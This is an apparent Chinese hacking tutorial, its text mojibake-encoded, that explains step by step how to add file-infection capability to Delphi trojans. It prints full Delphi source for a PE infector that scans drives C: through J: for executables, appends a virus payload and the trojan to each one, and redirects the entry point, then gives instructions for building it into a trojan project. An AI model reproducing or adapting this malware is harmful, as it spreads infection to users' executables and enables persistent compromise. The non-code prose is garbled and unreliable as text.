                              *Ä¾Âí¸ÐÈ¾½Ì³Ìmincer°æ*

                                                ¡ª¡ªÏ×¸ø°³×î°®µÄÐ¡»¨Ã±

   °³Ì¸Ì¸Ä¾ÂíºÍ²¡¶¾½áºÏµÄ¾ßÌåÎÊÌâ£¬Çë°´ÕÕ²½ÖèÒ»²½Ò»²½Ìí¼Ó£¬×ÐÏ¸ÔÄ¶Á
   --=Ê¹ÓÃÐ§¹û=--
   1.Ìí¼ÓºóÆÕÍ¨Ä¾Âí¿ÉÒÔ¾ßÓÐ´«È¾ÄÜÁ¦£¬´«È¾ËùÓÐÂß¼ÅÌµÄ¿ÉÖ´ÐÐµµ¡£
   2.²»»áÖØ¸´¸ÐÈ¾¡£
   3.´«È¾ËùÓÐÊôÐÔÎÄ¼þ£¨^_^£©¡£
   4.ÊÇ¸ø»¨ÐÎÄ¾Âí¡ª¡ª¡°³õÁµÇéÈË¡±Ð´µÄ£¬²»¾ÃËû¾Í»á¼ÓÉÏÕâ¸ö¹¦ÄÜ¡£ÏÖÔÚµÄ°æ±¾
   ¿ÉÒÔµ½°³µÄÕ¾ÏÂÔØ¡£
   5.×¨ÓÃÓÚDELPHIÄ¾Âí¡£
   6.Ö÷³ÌÐò»ã±à±àÐ´£¬¿Ç³ÌÐòDELPHI±àÐ´¡£
   7.Create by mincer
   8.×ðÖØmincerÀÍ¶¯£¬×ªÔØ×¢Ã÷³ö´¦:mincerÖ®¼Ò¡ª¡ªhttp://mincer.top263.net
   9.Ð¡»¨Ã±£¬°³°®ËÀÄãÁË£¬ËäÈ»Äã»¹²»ÈÏÊ¶°³:-<

   ×¢ÒâÔ³ÌÐò²»Òª¸ÄÐ´£¬ÀïÃæÓÐºÜ¶à¶«Î÷ºÍ»ã±à×ÊÔ´¹ØÁª£¬·ñÔò²»¿ÉÊ¹ÓÃ¡£
   **********************************************************************
   *  ¡¶µÚÒ»²½¡·:                                                       *
   *  ½«ÒÔÏÂ´úÂë¸´ÖÆÕ³Ìùµ½ÄãµÄÄ¾Âí£¨Ö÷´°Ìå£©implementation¿éÏÂÃæ¡£      *
   **********************************************************************

   //====================================================================
   //code
   function IfInfected(filename:string):boolean;
   var
   tfile:tfilestream;
   PE_off:UINT;
   MZ_sigl:word;

   begin
   try

   tfile:= tfilestream.Create(filename,fmOpenRead or fmShareDenyNone);
   tfile.Read(MZ_sigl,2);
   if MZ_sigl<>$5a4d then
   begin
   IfInfected:= true;
   exit;
   end;

   tfile.Seek($53,soFromBeginning);
   tfile.Read(PE_off,4);
   if PE_off=$b1c3a8bb then
   begin
   IfInfected:= true;
   exit;
   end;

   tfile.Seek($3c,soFromBeginning);
   tfile.Read(PE_off,4);
   tfile.Seek(PE_off,soFromBeginning);
   tfile.Read(MZ_sigl,2);
   if MZ_sigl<>$4550 then
   begin
   IfInfected:= true;
   exit;
   end;
   except
   IfInfected:= False;
   end;
   IfInfected:= False;
   tfile.Free ;

   end;


   procedure scandisk(path:string);
   var rec:tsearchrec;
   Str_result:string;
   l:boolean;

   begin
   findfirst(path+'*.*',faAnyFile,rec);
   while FindNext(rec) = 0 do
   begin
   if ((rec.Attr and faDirectory)=faDirectory) and (rec.name<>'.') and (rec.Name<>'..') then
   scandisk(path+rec.name+'\');

   //Ö´ÐÐ²¡¶¾É¨ÃèÄ£¿é
   if ((rec.Attr and faDirectory)<>faDirectory) and (UpperCase(ExtractFileExt(rec.name))='.EXE') then
   begin
   //Ö´ÐÐ¸ÐÈ¾Ä£¿é
   l:=IfInfected(path+rec.name);
   if l=false then
   try
   infect(path+rec.name);
   except
   end;
   end;
   //DoEvents
   application.ProcessMessages;

   end;
   findclose(rec);
   end;


   procedure infect(host_filename:string);
   const
   v_SIZE=1152;
   OFFSET_RAV=$2aa;
   DFILE_SIZE=$2ca;
   DFILE_OFFSET=$2ce;

   var
   pe:_IMAGE_FILE_HEADER;
   ope:_IMAGE_OPTIONAL_HEADER;
   PE_OFFSET:integer;
   m_host:TFileStream;
   SECTION_OFFSET:integer;
   section:_IMAGE_SECTION_HEADER;
   iover:integer;
   OFFSET_Write:integer;
   buf:integer;
   virus_file:TMemoryStream;
   bin_file:TFileStream;
   bin_file_Size:integer;
   Bin_size:integer;
   normal_size:integer;
   RAV:integer;
   RES_File:TResourceStream;
   l:integer;
   begin
   FileSetAttr(host_filename,0);
   RES_File:=TResourceStream.Create(HInstance,'VIRUS','DATA');
   virus_file:=TMemoryStream.Create;
   RES_File.SaveToStream(virus_file);

   bin_file:=TFileStream.Create(application.ExeName,fmOpenRead or fmShareDenyNone);
   m_host:=TFileStream.Create(host_filename,fmOpenReadWrite{fmOpenRead or fmShareDenyNone});
   m_host.Seek($3c,soFromBeginning);
   m_host.Read(buf,4);
   m_host.Seek(buf+4,soFromBeginning);

   m_host.Read(pe,sizeof(pe));
   PE_OFFSET:=m_host.Position;
   m_host.Read(ope,sizeof(ope));
   m_host.Seek((pe.NumberOfSections-1)*$28,soFromCurrent);


   SECTION_OFFSET:=m_host.Position;
   m_host.Read(section,sizeof(section));


   //virus_file.LoadFromFile(virus_filename);

   virus_file.Seek(OFFSET_RAV ,soFromBeginning);
   RAV:=ope.ImageBase+ope.AddressOfEntryPoint;
   virus_file.Write(RAV,4);

   virus_file.Seek(DFILE_SIZE ,soFromBeginning);






   bin_file_Size:=bin_file.Size;
   virus_file.WriteBuffer(bin_file_Size,4);
   OFFSET_Write:=section.PointerToRawData+section.Misc.VirtualSize;

   virus_file.Seek(DFILE_OFFSET ,soFromBeginning);


   Bin_size:=OFFSET_Write+v_SIZE;
   virus_file.WriteBuffer(Bin_size,4);

   ope.AddressOfEntryPoint:=section.VirtualAddress+section.Misc.VirtualSize;
   ope.SizeOfImage:=ope.SizeOfImage+v_SIZE;
   section.SizeOfRawData:=section.Misc.VirtualSize+v_SIZE;
   section.Misc.VirtualSize:=section.SizeOfRawData;
   section.Characteristics:=IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_EXECUTE or section.Characteristics;


   m_host.Seek(PE_OFFSET,0);
   m_host.Write(ope,sizeof(ope));
   m_host.Seek(SECTION_OFFSET,0);
   m_host.Write(section,sizeof(section));
   m_host.Seek(OFFSET_Write,0);

   virus_file.Seek(0,0);
   normal_size:=virus_file.Size;
   m_host.CopyFrom(virus_file,normal_size);

   m_host.CopyFrom(bin_file,bin_file_size);
   m_host.Seek($53,soFromBeginning);
   iover:=$b1c3a8bb;
   m_host.write(iover,4);

   m_host.Free;
   virus_file.Free;
   bin_file.Free;
   RES_File.Free;
   end;


   procedure Start(TrojanFileName:string);
   var
   hmap:integer;
   IS_RUN:boolean;
   winpath:array[1..255] of byte;
   str_winpath:string;
   sysfile:boolean;

   begin

   IS_RUN:=false;
   sysfile:=false;
   GetWindowsDirectory(@winpath,255);
   str_winpath:=copy(pchar(@winpath),1,strlen(pchar(@winpath)));
   // showmessage(ExtractFileName(application.ExeName));
   if ExtractFileName(application.ExeName)<> '»¨Ã±.EXE'  then
   begin
   copyfile(pchar(application.ExeName),pchar(str_winpath+'\»¨Ã±.EXE'),true);
   winexec(str_winpath+'\»¨Ã±.EXE',0);
   end
   else
   begin
   sysfile:=true;
   hmap:=createfilemapping($0ffffffff,nil,page_readwrite,0,4,'»¨Ã±');
   if getlasterror=error_already_exists then
   begin
   IS_RUN:=true;
   closehandle(hmap);
   end;
   if  IS_RUN=false then
   begin
   scandisk('c:\');
   scandisk('d:\');
   scandisk('e:\');
   scandisk('f:\');
   scandisk('g:\');
   scandisk('h:\');
   scandisk('i:\');
   scandisk('j:\');
   //showmessage('end');
   end;
   end;
   //ÕâÀïÉèÖÃÄ¾ÂíµÄÏµÍ³ÎÄ¼þ
   if pos(ExtractFileName(application.ExeName),TrojanFileName)<>0 then
   sysfile:=true;
   if ((sysfile=false)or(IS_RUN=true))then
   application.Terminate;
   end;
   //code end
   //====================================================================

   **********************************************************************
   *  ¡¶µÚ¶þ²½¡·:                                                       *
   *  ÔÚÈ«¾Övar£¨¾ÍÊÇÉùÃ÷Form1µÄµØ·½£©²¿·ÖÉùÃ÷º¯ÊýºÍ¹ý³Ì¡£              *
   **********************************************************************

   //====================================================================
   var
     procedure infect(host_filename:string);
     procedure scandisk(path:string);
     function IfInfected(filename:string):boolean;
     procedure Start(TrojanFileName:string);
   //====================================================================


   **********************************************************************
   *  ¡¶µÚÈý²½¡·:                                                       *
   *  ÔÚdprÎÄ¼þprogramºóÃæÉùÃ÷×ÊÔ´ÎÄ¼þVirus.rc¡£                        *
   **********************************************************************

   //====================================================================

   program Project1;//ÕâÀïÊÇÔÓÐµÄ

   {$R 'Virus.res' 'Virus.rc'}//ÐÂ¼ÓµÄ
   //====================================================================

   **********************************************************************
   *  ¡¶µÚËÄ²½¡·:                                                       *
   *  °ÑVirus.rcºÍvirus.dat¸´ÖÆµ½ÄãµÄ¹¤³ÌÄ¿Â¼Àï¡£                       *
   **********************************************************************

   ---Ìí¼ÓÍê³É--

   --=Ê¹ÓÃ·½·¨=--
   ÔÚFormµÄCreateÀïÌí¼ÓÒ»Ìõ:
   start('ÄãµÄ×¤ÈëÏµÍ³Ä¾ÂíÃû³Æ');
   ×¢Òâ£º
   1@:ÄãµÄÃû³ÆÐÎÊ½Ò»¶¨Òª´óÐ´£¬ÇÒ¼ÓÀ©Õ¹Ãû£¬ÀýÈç'SERVER.EXE'
   2@:Ãû³ÆÊÇÄãÏë¿ª·þÎñµÄÎÄ¼þ£¨¾ÍÊÇÄÇÐ©¹Òµ½Æô¶¯×éÀïµÄÎÄ¼þ£©
   3@:Èç¹ûÓÐ¶à¸öÎÄ¼þÃûÐ´µ½Ò»Æð£¬ÖÐ¼äÓÃ'\'¸ô¿ª£¬Èç'SERVER.EXE\CHAT.EXE'



   http://mincer.top263.net
   mincer@263.net

   ÍêÁË¡£¡£¡£
